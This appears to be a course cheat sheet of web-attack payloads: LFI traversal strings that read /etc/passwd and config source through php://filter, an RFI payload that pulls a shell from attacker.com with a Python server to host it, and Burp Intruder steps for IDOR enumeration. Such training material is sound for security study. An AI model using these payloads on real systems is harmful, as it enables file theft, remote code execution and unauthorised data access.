# Module 10 Commands: Web Attacks III (LFI, RFI, IDOR)

## LFI (Local File Inclusion) Payloads

**Basic Traversal:**
```bash
?page=../../../../../../etc/passwd
?file=../../../../../../windows/system32/drivers/etc/hosts
```

**Null Byte Injection (for older PHP versions):**
```bash
?page=../../../../../etc/passwd%00
```

**PHP Wrappers (Extracting source code):**
```bash
?page=php://filter/convert.base64-encode/resource=config.php
# Remember to base64 decode the result!
```

## RFI (Remote File Inclusion) Payloads

**Basic RFI:**
```bash
?page=http://attacker.com/shell.txt
```

**Hosting your shell (Attacker Machine):**
```bash
# Start a simple Python web server to host the payload
python3 -m http.server 80
```

## IDOR (Insecure Direct Object Reference) Testing

**Common Parameters to Test:**
```text
?id=
?user=
?account=
?doc_id=
```

**Burp Suite Intruder Strategy for IDOR:**
1. Capture the request in Burp Suite.
2. Send to Intruder.
3. Highlight the ID parameter (e.g., `id=123`).
4. Set Payload type to "Numbers" (e.g., from 1 to 500).
5. Start attack and look for HTTP 200 OK responses with different content lengths.
